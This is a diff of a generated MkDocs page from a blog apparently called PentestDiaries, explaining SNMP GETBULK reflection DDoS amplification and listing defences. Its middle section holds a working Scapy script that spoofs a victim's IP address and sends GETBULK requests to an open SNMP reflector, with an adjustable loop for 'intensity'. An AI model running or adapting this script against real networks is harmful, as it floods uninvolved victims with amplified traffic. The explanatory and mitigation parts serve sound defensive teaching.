@@ -1,115 +1,731 @@
-<!DOCTYPE html>
-<html class="writer-html5" lang="en" >
-<head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-      <link rel="shortcut icon" href="../img/favicon.ico" />
-    <title>SNMP GetBulk - PentestDiaries</title>
-    <link rel="stylesheet" href="../css/theme.css" />
-    <link rel="stylesheet" href="../css/theme_extra.css" />
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
     
-      <script>
-        // Current page data
-        var mkdocs_page_name = "SNMP GetBulk";
-        var mkdocs_page_input_path = "snmpGetBulk.md";
-        var mkdocs_page_url = null;
-      </script>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Jamie Warren Philippe">
+      
+      
+      
+        <link rel="prev" href="../shadowIT/">
+      
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.5">
     
-    <!--[if lt IE 9]>
-      <script src="../js/html5shiv.min.js"></script>
-    <![endif]-->
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
-      <script>hljs.highlightAll();</script> 
-</head>
+    
+      
+        <title>SNMP 'GETBULK' Reflection DDoS – Weaponizing Network Services - PentestDiaries</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
 
-<body class="wy-body-for-nav" role="document">
 
-  <div class="wy-grid-for-nav">
-    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
-    <div class="wy-side-scroll">
-      <div class="wy-side-nav-search">
-          <a href=".." class="icon icon-home"> PentestDiaries
-        </a><div role="search">
-  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
-      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
-  </form>
-</div>
-      </div>
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
 
-      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
-              <ul>
-                <li class="toctree-l1"><a class="reference internal" href="..">Home</a>
-                </li>
-              </ul>
-              <p class="caption"><span class="caption-text">Penetration Testing</span></p>
-              <ul>
-                  <li class="toctree-l1"><a class="reference internal" href="../ExploitingRDGatewayVuln/">Exploiting RD Gateway Vulnerability</a>
-                  </li>
-                  <li class="toctree-l1"><a class="reference internal" href="../Exploiting_SMTP_Open_Relays/">Exploiting SMTP Open Relays</a>
-                  </li>
-                  <li class="toctree-l1"><a class="reference internal" href="../How_to_Own_a_Bank/">How to Own a Bank</a>
-                  </li>
-              </ul>
-              <p class="caption"><span class="caption-text">Exploiting Vulnerabilities</span></p>
-              <ul class="current">
-                  <li class="toctree-l1"><a class="reference internal" href="../MsExchangeInfoDisclosure/">Ms Exchange Info Disclosure</a>
-                  </li>
-                  <li class="toctree-l1"><a class="reference internal" href="../shadowIT/">Shadow IT</a>
-                  </li>
-                  <li class="toctree-l1 current"><a class="reference internal current" href="#">SNMP GetBulk</a>
-    <ul class="current">
-    <li class="toctree-l2"><a class="reference internal" href="#introduction">Introduction</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#how-snmp-getbulk-works">How SNMP 'GETBULK' Works</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#how-snmp-getbulk-becomes-a-ddos-amplification-tool">How SNMP 'GETBULK' Becomes a DDoS Amplification Tool</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#python-script-to-simulate-a-getbulk-reflection-attack">Python Script to Simulate a GETBULK Reflection Attack</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#expected-outcomes">Expected Outcomes</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#mitigation-defense-strategies">Mitigation &amp; Defense Strategies</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#conclusion">Conclusion</a>
-    </li>
-    </ul>
-                  </li>
-              </ul>
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#snmp-getbulk-reflection-ddos-weaponizing-network-services" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="PentestDiaries" class="md-header__button md-logo" aria-label="PentestDiaries" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PentestDiaries
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SNMP 'GETBULK' Reflection DDoS – Weaponizing Network Services
+            
+          </span>
+        </div>
       </div>
     </div>
-    </nav>
-
-    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
-      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
-          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
-          <a href="..">PentestDiaries</a>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
         
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
       </nav>
-      <div class="wy-nav-content">
-        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
-  <ul class="wy-breadcrumbs">
-    <li><a href=".." class="icon icon-home" aria-label="Docs"></a></li>
-          <li class="breadcrumb-item">Exploiting Vulnerabilities</li>
-      <li class="breadcrumb-item active">SNMP GetBulk</li>
-    <li class="wy-breadcrumbs-aside">
-    </li>
-  </ul>
-  <hr/>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
 </div>
-          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
-            <div class="section" itemprop="articleBody">
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../ExploitingRDGatewayVuln/" class="md-tabs__link">
+          
+  
+  Penetration Testing
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../MsExchangeInfoDisclosure/" class="md-tabs__link">
+          
+  
+  Exploiting Vulnerabilities
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
               
-                <h1 id="snmp-getbulk-reflection-ddos-weaponizing-network-services">🚀 SNMP 'GETBULK' Reflection DDoS – Weaponizing Network Services</h1>
-<h2 id="introduction"><strong>Introduction</strong></h2>
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="PentestDiaries" class="md-nav__button md-logo" aria-label="PentestDiaries" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PentestDiaries
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Penetration Testing
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Penetration Testing
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ExploitingRDGatewayVuln/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Exploiting RD Gateway Vulnerability
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Exploiting_SMTP_Open_Relays/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Exploiting SMTP Open Relays
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../How_to_Own_a_Bank/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    How to Own a Bank
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Exploiting Vulnerabilities
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Exploiting Vulnerabilities
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../MsExchangeInfoDisclosure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ms Exchange Info Disclosure
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shadowIT/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shadow IT
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    SNMP GetBulk
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    SNMP GetBulk
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-snmp-getbulk-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      How SNMP 'GETBULK' Works
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-snmp-getbulk-becomes-a-ddos-amplification-tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      How SNMP 'GETBULK' Becomes a DDoS Amplification Tool
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#python-script-to-simulate-a-getbulk-reflection-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Python Script to Simulate a GETBULK Reflection Attack
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#expected-outcomes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Expected Outcomes
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitigation-defense-strategies" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation &amp; Defense Strategies
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-snmp-getbulk-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      How SNMP 'GETBULK' Works
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-snmp-getbulk-becomes-a-ddos-amplification-tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      How SNMP 'GETBULK' Becomes a DDoS Amplification Tool
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#python-script-to-simulate-a-getbulk-reflection-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Python Script to Simulate a GETBULK Reflection Attack
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#expected-outcomes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Expected Outcomes
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitigation-defense-strategies" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation &amp; Defense Strategies
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="snmp-getbulk-reflection-ddos-weaponizing-network-services">🚀 SNMP 'GETBULK' Reflection DDoS – Weaponizing Network Services<a class="headerlink" href="#snmp-getbulk-reflection-ddos-weaponizing-network-services" title="Permanent link">&para;</a></h1>
+<h2 id="introduction"><strong>Introduction</strong><a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
 <p>Ever heard of <strong>SNMP GETBULK?</strong> If not, congratulations on not being a network engineer. If yes, then you probably know that <strong>Simple Network Management Protocol (SNMP)</strong> is supposed to make life easier—but surprise! It can also be used to wreak havoc on networks through <strong>reflection-based DDoS attacks</strong>. </p>
 <p>Today, we’ll explore:
 1. <strong>How SNMP 'GETBULK' works</strong> (for those who don’t love reading RFCs for fun).
 2. <strong>How attackers abuse it for DDoS reflection</strong> (because of course they do).
 3. <strong>How to simulate the attack</strong> (for <em>educational purposes</em>, obviously).
 4. <strong>How to prevent your network from being an unwilling accomplice</strong> (unless you <em>want</em> to be a botnet).</p>
-<h2 id="how-snmp-getbulk-works"><strong>How SNMP 'GETBULK' Works</strong></h2>
+<h2 id="how-snmp-getbulk-works"><strong>How SNMP 'GETBULK' Works</strong><a class="headerlink" href="#how-snmp-getbulk-works" title="Permanent link">&para;</a></h2>
 <p>SNMP is typically used for network monitoring, allowing admins to query devices for status updates. The <strong>GETBULK request</strong> is part of SNMPv2 and is meant to efficiently retrieve large amounts of data at once (because who wants to send multiple small queries?).</p>
 <p>A typical <strong>GETBULK request</strong> structure looks like this:</p>
 <table>
@@ -151,7 +767,7 @@
 </tbody>
 </table>
 <p>Normally, this helps <strong>network admins</strong> get bulk data efficiently. But guess what? <strong>Attackers don’t care about efficiency—they care about bandwidth amplification.</strong></p>
-<h2 id="how-snmp-getbulk-becomes-a-ddos-amplification-tool"><strong>How SNMP 'GETBULK' Becomes a DDoS Amplification Tool</strong></h2>
+<h2 id="how-snmp-getbulk-becomes-a-ddos-amplification-tool"><strong>How SNMP 'GETBULK' Becomes a DDoS Amplification Tool</strong><a class="headerlink" href="#how-snmp-getbulk-becomes-a-ddos-amplification-tool" title="Permanent link">&para;</a></h2>
 <p>Reflection DDoS attacks work by <strong>spoofing</strong> the source IP address of requests, making a victim think they’re receiving replies from legitimate sources. SNMP <strong>GETBULK</strong> is perfect for this because:</p>
 <ul>
 <li>The attacker sends a <strong>small query</strong> to an SNMP-enabled device.</li>
@@ -159,40 +775,39 @@
 <li>Multiply this by thousands of devices, and suddenly, the victim’s network is drowning in data.</li>
 </ul>
 <p>💡 <strong>Amplification factor:</strong> Depending on how <strong>misconfigured</strong> (or <em>helpful</em>) the SNMP device is, the response can be <strong>up to 100x the original request size.</strong> That’s <em>free bandwidth</em> for attackers and <em>bad news</em> for targets.</p>
-<h2 id="python-script-to-simulate-a-getbulk-reflection-attack"><strong>Python Script to Simulate a GETBULK Reflection Attack</strong></h2>
+<h2 id="python-script-to-simulate-a-getbulk-reflection-attack"><strong>Python Script to Simulate a GETBULK Reflection Attack</strong><a class="headerlink" href="#python-script-to-simulate-a-getbulk-reflection-attack" title="Permanent link">&para;</a></h2>
 <p>Want to see it in action? Here’s a simple <strong>Python script</strong> that sends SNMP <strong>GETBULK</strong> requests to an open SNMP server while spoofing the victim’s IP. (Obviously, use responsibly.)</p>
-<pre class="codehilite"><code class="language-python">from scapy.all import *
-import random
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">scapy.all</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
 
-# Target SNMP server (reflector) and victim
-REFLECTOR_IP = &quot;192.168.1.100&quot;  # Change this to an open SNMP server
-VICTIM_IP = &quot;203.0.113.50&quot;  # Change this to your victim’s IP
-SNMP_PORT = 161  # Default SNMP port
+<span class="c1"># Target SNMP server (reflector) and victim</span>
+<span class="n">REFLECTOR_IP</span> <span class="o">=</span> <span class="s2">&quot;192.168.1.100&quot;</span>  <span class="c1"># Change this to an open SNMP server</span>
+<span class="n">VICTIM_IP</span> <span class="o">=</span> <span class="s2">&quot;203.0.113.50&quot;</span>  <span class="c1"># Change this to your victim’s IP</span>
+<span class="n">SNMP_PORT</span> <span class="o">=</span> <span class="mi">161</span>  <span class="c1"># Default SNMP port</span>
 
-# Craft an SNMP GETBULK request (basic structure)
-def craft_snmp_getbulk():
-    snmp_packet = IP(src=VICTIM_IP, dst=REFLECTOR_IP) / UDP(sport=random.randint(1024, 65535), dport=SNMP_PORT) /
-        SNMP(version=2, community=&quot;public&quot;, PDU=SNMPbulk(id=random.randint(1000, 9999), non_repeaters=0, max_repetitions=50))
-    return snmp_packet
+<span class="c1"># Craft an SNMP GETBULK request (basic structure)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">craft_snmp_getbulk</span><span class="p">():</span>
+    <span class="n">snmp_packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">VICTIM_IP</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">REFLECTOR_IP</span><span class="p">)</span> <span class="o">/</span> <span class="n">UDP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="mi">65535</span><span class="p">),</span> <span class="n">dport</span><span class="o">=</span><span class="n">SNMP_PORT</span><span class="p">)</span> <span class="o">/</span>
+        <span class="n">SNMP</span><span class="p">(</span><span class="n">version</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">community</span><span class="o">=</span><span class="s2">&quot;public&quot;</span><span class="p">,</span> <span class="n">PDU</span><span class="o">=</span><span class="n">SNMPbulk</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">9999</span><span class="p">),</span> <span class="n">non_repeaters</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">max_repetitions</span><span class="o">=</span><span class="mi">50</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">snmp_packet</span>
 
-# Send SNMP GETBULK packets
-def send_reflection_attack():
-    print(f&quot;[+] Sending spoofed SNMP GETBULK requests to {REFLECTOR_IP}, victim: {VICTIM_IP}&quot;)
-    for _ in range(10):  # Adjust for desired intensity
-        packet = craft_snmp_getbulk()
-        send(packet, verbose=False)
-    print(&quot;[+] Packets sent!&quot;)
+<span class="c1"># Send SNMP GETBULK packets</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">send_reflection_attack</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Sending spoofed SNMP GETBULK requests to </span><span class="si">{</span><span class="n">REFLECTOR_IP</span><span class="si">}</span><span class="s2">, victim: </span><span class="si">{</span><span class="n">VICTIM_IP</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>  <span class="c1"># Adjust for desired intensity</span>
+        <span class="n">packet</span> <span class="o">=</span> <span class="n">craft_snmp_getbulk</span><span class="p">()</span>
+        <span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Packets sent!&quot;</span><span class="p">)</span>
 
-send_reflection_attack()
-</code></pre>
-
-<h2 id="expected-outcomes"><strong>Expected Outcomes</strong></h2>
+<span class="n">send_reflection_attack</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="expected-outcomes"><strong>Expected Outcomes</strong><a class="headerlink" href="#expected-outcomes" title="Permanent link">&para;</a></h2>
 <ul>
 <li><strong>If the SNMP server replies to the victim’s IP with a huge response</strong> → You’ve confirmed a reflection vulnerability.</li>
 <li><strong>If nothing happens</strong> → The SNMP server might be properly secured (<em>shocking!</em>).</li>
 <li><strong>If you accidentally crash something</strong> → Whoops. Maybe don’t test this on production?</li>
 </ul>
-<h2 id="mitigation-defense-strategies"><strong>Mitigation &amp; Defense Strategies</strong></h2>
+<h2 id="mitigation-defense-strategies"><strong>Mitigation &amp; Defense Strategies</strong><a class="headerlink" href="#mitigation-defense-strategies" title="Permanent link">&para;</a></h2>
 <p>Tired of being part of a botnet? Here’s how to avoid it:</p>
 <p>✅ <strong>Disable SNMP if you don’t use it.</strong> (Seriously, most people don’t even need it.)
 ✅ <strong>Restrict SNMP to internal networks.</strong> (Your printer does <em>not</em> need to talk to the entire internet.)
@@ -200,54 +815,66 @@ send_reflection_attack()
 ✅ <strong>Rate-limit SNMP responses.</strong> (Your device doesn’t need to flood the internet with responses.)
 ✅ <strong>Block UDP port 161 from untrusted sources.</strong> (If it’s public, you’re <em>asking</em> for trouble.)
 ✅ <strong>Upgrade to SNMPv3 with authentication.</strong> (SNMPv2c is basically an open bar for attackers.)</p>
-<h2 id="conclusion"><strong>Conclusion</strong></h2>
+<h2 id="conclusion"><strong>Conclusion</strong><a class="headerlink" href="#conclusion" title="Permanent link">&para;</a></h2>
 <p>SNMP 'GETBULK' is a great tool for network management—until it isn’t. With a <strong>100x amplification factor</strong>, it’s a favorite among DDoS attackers looking to overwhelm targets with reflected traffic. </p>
 <p>The good news? <strong>A few simple security measures</strong> can prevent your devices from being hijacked into a botnet. So lock it down before someone turns your innocent network printer into a DDoS cannon. 🔥</p>
 <hr />
 <p>🔹 <strong>Want to see more network exploitation techniques?</strong> Stay tuned for upcoming posts! 🚀</p>
 <p>💬 <strong>Got thoughts or questions?</strong> Drop them below, or complain to your local IT admin! 😉</p>
-              
+
